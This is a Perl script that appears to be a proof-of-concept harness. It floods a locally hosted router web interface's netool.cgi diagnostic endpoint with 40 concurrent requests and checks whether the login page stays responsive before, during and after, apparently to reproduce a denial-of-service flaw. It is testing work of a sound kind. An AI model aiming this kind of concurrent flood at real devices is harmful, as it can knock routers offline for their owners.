#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;

sub pause {
    my ($seconds) = @_;
    select(undef, undef, undef, $seconds);
}

sub exchange {
    my ($payload, $timeout) = @_;
    $timeout //= 8;
    my $started = CORE::time();
    my $sock = IO::Socket::INET->new(
        PeerAddr => '127.0.0.1', PeerPort => 80, Proto => 'tcp', Timeout => $timeout,
    );
    return ('', CORE::time() - $started) unless $sock;
    $sock->autoflush(1);
    print {$sock} $payload;
    shutdown($sock, 1);
    my $response = '';
    while (length($response) < 65536) {
        my $block = '';
        my $count = sysread($sock, $block, 4096);
        last if !defined($count) || $count == 0;
        $response .= $block;
    }
    close($sock);
    return ($response, CORE::time() - $started);
}

sub get_request {
    my ($path) = @_;
    return "GET $path HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n";
}

sub control {
    my ($label) = @_;
    my ($response, $elapsed) = exchange(get_request('/Main_Login.asp'), 8);
    printf(
        "control=%s live=%s bytes=%d elapsed=%.3f\n",
        $label, ($response =~ /^HTTP\// ? 'yes' : 'no'), length($response), $elapsed,
    );
}

control('before');
my $path =
    '/netool.cgi?type=3&target=192.0.2.1&pcnt=1&response=10&exec=10';
my @children;
for my $index (1 .. 40) {
    my $pid = fork();
    die "fork failed\n" unless defined($pid);
    if ($pid == 0) {
        my ($response, $elapsed) = exchange(get_request($path), 12);
        printf(
            "worker=%d success=%s bytes=%d elapsed=%.3f\n",
            $index, ($response =~ /"successful"\s*:\s*"1"/ ? 'yes' : 'no'),
            length($response), $elapsed,
        );
        exit 0;
    }
    push @children, $pid;
}
pause(0.25);
control('during-1');
control('during-2');
waitpid($_, 0) for @children;
control('after');
